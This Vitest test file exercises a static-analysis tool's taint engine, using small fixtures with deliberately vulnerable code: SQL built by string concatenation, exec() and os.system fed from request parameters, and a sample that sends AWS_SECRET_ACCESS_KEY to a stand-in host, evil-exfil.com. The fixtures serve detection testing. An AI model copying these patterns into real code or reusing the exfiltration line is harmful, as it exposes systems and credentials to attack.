import { describe, it, expect, beforeAll } from 'vitest';
import path from 'node:path';
import fs from 'node:fs';
import os from 'node:os';
import {
  TreeSitterLoader,
  TaintEngine,
  ImportGraph,
  SastReachabilityAnalyzer,
  CallGraphExtractor,
} from '../src/index.js';
import type { NormalizedFinding } from '@secureship/contracts';

describe('Inter-Procedural Data-Flow & Taint Analysis Suite (Blocker 4 Production Grade)', () => {
  beforeAll(async () => {
    await TreeSitterLoader.init();
  });

  describe('CallGraphExtractor', () => {
    it('extracts declared functions, parameters, and call sites accurately in TypeScript', () => {
      const code = `
export function queryUser(name: string, limit: number) {
  return db.query("SELECT * FROM users WHERE name = " + name);
}

export const searchHandler = (req, res) => {
  const q = req.query.q;
  queryUser(q, 10);
};
`;
      const parseRes = TreeSitterLoader.parseFile(code, 'typescript');
      expect(parseRes.tree).not.toBeNull();

      const summary = CallGraphExtractor.extract(parseRes.tree!.rootNode, 'user-repo.ts');
      expect(summary.functions.has('queryUser')).toBe(true);
      expect(summary.functions.has('searchHandler')).toBe(true);

      const queryFn = summary.functions.get('queryUser')!;
      expect(queryFn.parameters.length).toBe(2);
      expect(queryFn.parameters[0]!.name).toBe('name');
      expect(queryFn.parameters[1]!.name).toBe('limit');

      const calls = summary.callSites;
      expect(calls.some((c) => c.calleeName === 'query')).toBe(true);
      expect(calls.some((c) => c.calleeName === 'queryUser')).toBe(true);
    });
  });

  describe('Intra-File Inter-Procedural Taint (Helper function calls)', () => {
    it('detects taint when finding is inside helper function called by HTTP route handler in same file', () => {
      const code = `
import { exec } from 'child_process';

function executeCommand(cmd) {
  exec(cmd); // Finding at line 5
}

export function handleUserAction(req, res) {
  const userParam = req.query.action;
  executeCommand(userParam);
}
`;
      const result = TaintEngine.analyze({
        filePath: 'actions.js',
        fileContent: code,
        findingLine: 5,
      });

      expect(result.hasTaintFlow).toBe(true);
      expect(result.taintDetail).toBeDefined();
      expect(result.taintDetail!.sinkType).toBe('COMMAND_INJECTION');
      expect(result.taintDetail!.sourceType).toBe('HTTP_QUERY');
      expect(result.taintDetail!.taintSteps.length).toBeGreaterThanOrEqual(2);
      expect(result.notes).toContain('Confirmed inter-procedural exploit taint flow');
    });
  });

  describe('Cross-File Inter-Procedural Taint (Layered Enterprise Architecture)', () => {
    it('traces 3-tier Controller -> Service -> Repository cross-file taint flow to SQL sink', async () => {
      const testDir = path.join(os.tmpdir(), `secureship-inter-proc-3tier-${Date.now()}`);
      fs.mkdirSync(testDir, { recursive: true });

      try {
        // File 1: Repository (Sink is here)
        const repoFile = path.join(testDir, 'user.repository.ts');
        fs.writeFileSync(
          repoFile,
          `import { db } from './db.js';

export function runUserQuery(name: string) {
  const sql = "SELECT * FROM users WHERE name = '" + name + "'";
  db.query(sql); // Finding at line 5
}
`
        );

        // File 2: Service (Pass-through / Business Logic)
        const serviceFile = path.join(testDir, 'user.service.ts');
        fs.writeFileSync(
          serviceFile,
          `import { runUserQuery } from './user.repository.js';

export function findUser(username: string) {
  return runUserQuery(username);
}
`
        );

        // File 3: Controller (Source is here)
        const controllerFile = path.join(testDir, 'user.controller.ts');
        fs.writeFileSync(
          controllerFile,
          `import { findUser } from './user.service.js';

export function handleSearch(req, res) {
  const term = req.query.q;
  const user = findUser(term);
  res.json(user);
}
`
        );

        // Build project import graph
        const graph = await ImportGraph.build(testDir, { noCache: true });

        // Analyze finding at line 5 of repository
        const repoContent = fs.readFileSync(repoFile, 'utf8');
        const result = TaintEngine.analyze({
          filePath: repoFile,
          fileContent: repoContent,
          findingLine: 5,
          importGraph: graph,
          projectRoot: testDir,
        });

        expect(result.hasTaintFlow).toBe(true);
        expect(result.taintDetail).toBeDefined();
        expect(result.taintDetail!.sinkType).toBe('SQL_QUERY');
        expect(result.taintDetail!.sourceType).toBe('HTTP_QUERY');
        expect(result.taintDetail!.isExploitable).toBe(true);
        expect(result.taintDetail!.taintSteps.length).toBeGreaterThanOrEqual(3);
        expect(result.notes).toContain('Confirmed inter-procedural exploit taint flow');
      } finally {
        fs.rmSync(testDir, { recursive: true, force: true });
      }
    });

    it('neutralizes cross-file taint when sanitizer (parseInt) is used in intermediary service layer', async () => {
      const testDir = path.join(os.tmpdir(), `secureship-inter-proc-sanitized-${Date.now()}`);
      fs.mkdirSync(testDir, { recursive: true });

      try {
        // File 1: Repository
        const repoFile = path.join(testDir, 'item.repository.ts');
        fs.writeFileSync(
          repoFile,
          `import { db } from './db.js';

export function queryItemById(id: number) {
  const sql = "SELECT * FROM items WHERE id = " + id;
  db.query(sql); // line 5
}
`
        );

        // File 2: Service with sanitizer!
        const serviceFile = path.join(testDir, 'item.service.ts');
        fs.writeFileSync(
          serviceFile,
          `import { queryItemById } from './item.repository.js';

export function getItem(rawId: string) {
  const safeId = parseInt(rawId);
  return queryItemById(safeId);
}
`
        );

        // File 3: Controller
        const controllerFile = path.join(testDir, 'item.controller.ts');
        fs.writeFileSync(
          controllerFile,
          `import { getItem } from './item.service.js';

export function handleGetItem(req, res) {
  const idStr = req.query.id;
  return getItem(idStr);
}
`
        );

        const graph = await ImportGraph.build(testDir, { noCache: true });
        const repoContent = fs.readFileSync(repoFile, 'utf8');

        const result = TaintEngine.analyze({
          filePath: repoFile,
          fileContent: repoContent,
          findingLine: 5,
          importGraph: graph,
          projectRoot: testDir,
        });

        // Taint was neutralized by parseInt in service layer!
        expect(result.hasTaintFlow).toBe(false);
      } finally {
        fs.rmSync(testDir, { recursive: true, force: true });
      }
    });
  });

  describe('Safe Parameterized Query Recognition (False Positive Prevention)', () => {
    it('identifies parameterized SQL query bindings ($1 / ?) as safe and non-vulnerable', () => {
      const code = `
import { db } from './db.js';

export function findById(req, res) {
  const userId = req.query.id;
  db.query("SELECT * FROM users WHERE id = $1", [userId]); // line 6
}
`;
      const result = TaintEngine.analyze({
        filePath: 'user-db.js',
        fileContent: code,
        findingLine: 6,
      });

      expect(result.hasTaintFlow).toBe(false);
      expect(result.isSanitized).toBe(true);
      expect(result.notes).toContain('safe parameterized query bindings');
    });

    it('identifies Python MySQL/Postgres parameterized queries with %s and tuple as safe', () => {
      const code = `
from db import cursor
from flask import request

def get_profile():
    user = request.args.get('user')
    cursor.execute("SELECT * FROM profiles WHERE username = %s", (user,)) # line 7
`;
      const result = TaintEngine.analyze({
        filePath: 'profile.py',
        fileContent: code,
        findingLine: 7,
      });

      expect(result.hasTaintFlow).toBe(false);
      expect(result.isSanitized).toBe(true);
      expect(result.notes).toContain('safe parameterized query bindings');
    });
  });

  describe('Cross-Language Inter-Procedural Taint (Python & Go)', () => {
    it('traces cross-file taint in Python Flask layered application', async () => {
      const testDir = path.join(os.tmpdir(), `secureship-py-taint-${Date.now()}`);
      fs.mkdirSync(testDir, { recursive: true });

      try {
        const cmdFile = path.join(testDir, 'backup_ops.py');
        fs.writeFileSync(
          cmdFile,
          `import os

def execute_backup(folder):
    os.system("tar -czf backup.tar.gz " + folder) # line 4
`
        );

        const appFile = path.join(testDir, 'app.py');
        fs.writeFileSync(
          appFile,
          `from flask import request
from backup_ops import execute_backup

def backup_route():
    target = request.args.get('path')
    execute_backup(target)
`
        );

        const graph = await ImportGraph.build(testDir, { noCache: true });
        const cmdContent = fs.readFileSync(cmdFile, 'utf8');

        const result = TaintEngine.analyze({
          filePath: cmdFile,
          fileContent: cmdContent,
          findingLine: 4,
          importGraph: graph,
          projectRoot: testDir,
        });

        expect(result.hasTaintFlow).toBe(true);
        expect(result.taintDetail).toBeDefined();
        expect(result.taintDetail!.sinkType).toBe('COMMAND_INJECTION');
        expect(result.taintDetail!.sourceType).toBe('HTTP_QUERY');
        expect(result.notes).toContain('Confirmed inter-procedural exploit taint flow');
      } finally {
        fs.rmSync(testDir, { recursive: true, force: true });
      }
    });
  });

  describe('Forward Taint Tracking for Supply Chain Threat Detection', () => {
    it('detects environment variable exfiltration via outbound network call (SC-TAINT-001 pattern)', () => {
      const code = `
import https from 'node:https';

export function telemetry() {
  const secretKey = process.env.AWS_SECRET_ACCESS_KEY;
  https.get('https://evil-exfil.com?key=' + secretKey);
}
`;
      const flows = TaintEngine.findTaintFlowsInFile('malicious-pkg/index.js', code);
      expect(flows.length).toBeGreaterThan(0);
      const exfil = flows[0]!;
      expect(exfil.sourceType).toBe('ENVIRONMENT');
      expect(exfil.sinkType).toBe('SSRF');
      expect(exfil.isExploitable).toBe(true);
    });
  });

  describe('SastReachabilityAnalyzer End-to-End Inter-Procedural Taint Elevation', () => {
    it('elevates cross-file finding to REACHABLE_CALL_PATH with full multi-hop chain', async () => {
      const testDir = path.join(os.tmpdir(), `secureship-sast-interproc-${Date.now()}`);
      fs.mkdirSync(testDir, { recursive: true });

      try {
        const repoFile = path.join(testDir, 'query.ts');
        fs.writeFileSync(
          repoFile,
          `import { exec } from 'child_process';
export function runCmd(cmd: string) {
  exec(cmd); // line 3
}
`
        );

        const entryFile = path.join(testDir, 'index.ts');
        fs.writeFileSync(
          entryFile,
          `import { runCmd } from './query.js';
export function handle(req, res) {
  const command = req.query.c;
  runCmd(command);
}
handle();
`
        );

        const graph = await ImportGraph.build(testDir, { noCache: true });

        const finding: NormalizedFinding = {
          id: 'test-cross-1',
          fingerprint: 'c'.repeat(64),
          ruleId: 'SS-SAST-exec',
          scannerName: 'opengrep',
          category: 'SAST',
          severity: 'CRITICAL',
          title: 'Remote Command Execution',
          description: 'exec() sink',
          reachability: 'UNKNOWN',
          location: {
            filePath: 'query.ts',
            startLine: 3,
            endLine: 3,
          },
          scopeTag: 'PRODUCTION',
          verificationStatus: 'UNVERIFIED',
          upstreamValidationStatus: 'UNKNOWN',
          createdAt: new Date().toISOString(),
          evidence: [],
          cweIds: ['CWE-78'],
          confidence: 'HIGH',
        };

        const detail = SastReachabilityAnalyzer.analyze(finding, graph, testDir);

        expect(detail.verdict).toBe('REACHABLE_CALL_PATH');
        expect(detail.evidence.kind).toBe('TAINT_FLOW');
        expect(detail.evidence.taintFlow).toBeDefined();
        expect(detail.evidence.taintFlow!.sourceType).toBe('HTTP_QUERY');
        expect(detail.evidence.taintFlow!.sinkType).toBe('COMMAND_INJECTION');
        expect(detail.evidence.notes).toContain('inter-procedural exploit taint flow');
      } finally {
        fs.rmSync(testDir, { recursive: true, force: true });
      }
    });
  });
});
